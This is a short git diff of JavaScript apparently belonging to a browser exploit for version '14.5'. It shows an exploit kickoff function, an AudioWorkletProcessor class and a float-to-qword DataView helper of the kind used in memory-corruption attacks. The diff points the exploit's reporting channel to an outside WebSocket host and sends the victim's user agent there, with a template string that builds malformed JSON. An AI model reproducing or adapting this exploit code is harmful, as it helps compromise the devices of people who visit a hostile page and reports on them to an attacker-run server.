@@ -1,4 +1,4 @@
-var socket = io.connect("/");
+var socket = new WebSocket("wss://slug-detected.herokuapp.com/")
 
 function sleep(sleepDuration) {
 	var now = new Date().getTime();
@@ -54,10 +54,10 @@ class OrigineWorklet2 extends AudioWorkletProcessor {
 }
 
 function kickstart145() {
-	socket.send("exploit_start", {
+	socket.send(`{
 		exploitVersion: "14.5",
-		userAgent: navigator.userAgent,
-	});
+		userAgent: ${navigator.userAgent},
+	}`);
 	let data_view = new DataView(new ArrayBuffer(8));
 	var floatAsQword = (float) => {
 		data_view.setFloat64(0, float, true);
